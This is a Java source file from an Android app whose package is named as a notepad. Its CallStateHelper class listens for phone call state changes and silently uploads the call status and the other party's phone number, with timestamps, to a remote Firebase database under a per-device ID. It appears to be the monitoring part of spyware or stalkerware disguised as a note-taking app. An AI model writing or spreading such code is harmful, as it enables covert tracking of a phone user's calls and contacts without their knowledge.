package com.megh.notepad;

import android.content.Context;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class CallStateHelper {

    private static TelephonyManager telephonyManager;
    private static PhoneStateListener phoneStateListener;

    public static void startMonitoring(final Context context) {
        if (telephonyManager == null) {
            telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        }

        if (phoneStateListener == null) {
            phoneStateListener = new PhoneStateListener() {
                @Override
                public void onCallStateChanged(int state, String phoneNumber) {
                    String callStatus = "";
                    String number = (phoneNumber != null && !phoneNumber.isEmpty()) ? phoneNumber : "Hidden/Unknown";

                    switch (state) {
                        case TelephonyManager.CALL_STATE_IDLE:
                            callStatus = "No Active Call";
                            number = "N/A";
                            break;
                        case TelephonyManager.CALL_STATE_RINGING:
                            callStatus = "Ringing (Incoming)";
                            break;
                        case TelephonyManager.CALL_STATE_OFFHOOK:
                            callStatus = "Speaking (SIM Call)";
                            break;
                    }
                    
                    updateFirebase(callStatus, number, "SIM Card");
                }
            };
            
            // 🌟 Android 14 / Permission Crash Fix 🌟
            try {
                telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE);
                Log.d("CallStateHelper", "SIM Call monitoring started.");
            } catch (SecurityException e) {
                // পারমিশন না থাকলে অ্যাপ ক্র্যাশ করবে না, শুধু এই মেসেজটি লগে দেখাবে
                Log.e("CallStateHelper", "Permission missing for Call State: " + e.getMessage());
            } catch (Exception e) {
                Log.e("CallStateHelper", "Error: " + e.getMessage());
            }
        }
    }

    public static void stopMonitoring() {
        try {
            if (telephonyManager != null && phoneStateListener != null) {
                telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE);
                phoneStateListener = null;
            }
        } catch (Exception e) {
            Log.e("CallStateHelper", "Stop Error: " + e.getMessage());
        }
    }

    private static void updateFirebase(String status, String talkingWith, String appName) {
        try {
            DatabaseReference dbRef = FirebaseDatabase.getInstance()
                    .getReference("DeviceData").child(BackgroundService.USER_ID).child("ActiveCall");

            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss a", Locale.getDefault());
            String time = sdf.format(new Date());

            Map<String, Object> data = new HashMap<>();
            data.put("Call_Status", status);
            data.put("Talking_With", talkingWith);
            data.put("App_Name", appName);
            data.put("Last_Updated", time);

            dbRef.setValue(data);
        } catch (Exception e) {
            Log.e("CallStateHelper", "Error: " + e.getMessage());
        }
    }
}

